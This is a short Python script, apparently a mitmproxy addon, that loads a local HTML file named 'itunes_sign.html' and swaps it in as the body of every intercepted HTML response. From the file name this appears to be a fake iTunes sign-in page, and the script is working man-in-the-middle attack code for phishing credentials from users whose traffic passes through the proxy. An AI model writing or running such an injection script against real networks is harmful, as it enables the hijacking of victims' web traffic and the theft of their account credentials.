
with open('itunes_sign.html', 'r') as inf:
    payload = inf.read()

def response(flow):
    if 'content-type' in flow.response.headers and 'text/html' in flow.response.headers['content-type']:
        flow.response.text = payload
